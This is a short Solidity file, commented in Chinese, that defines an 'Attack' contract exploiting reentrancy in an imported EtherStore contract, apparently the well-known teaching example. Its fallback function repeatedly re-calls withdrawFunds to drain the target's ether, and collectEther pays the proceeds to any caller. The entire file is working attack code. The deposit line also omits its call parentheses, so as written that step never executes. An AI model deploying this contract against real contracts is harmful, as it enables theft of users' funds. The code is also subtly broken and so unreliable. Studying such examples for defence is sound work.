// 重入攻击合约
pragma solidity ^0.4.25;

import "./EtherStore.sol";

contract Attack {
	EtherStore public etherStore;

	// 通过合约地址初始化构造函数
	constructor(address _etherStoreAddress) {
		etherStore = EtherStore(_etherStoreAddress);
	}

	function pwnEtherStore() public payable {
		require(msg.value >= 1 ether);
		etherStore.depositFunds.value(1 ether);
		etherStore.withdrawFunds(1 ether);
	}

	function collectEther() public {
		msg.sender.transfer(this.balance);
	}

	// 回退函数
	function() payable {
		if (etherStore.balance > 1 ether) {
			etherStore.withdrawFunds(1 ether);
		}
	}

}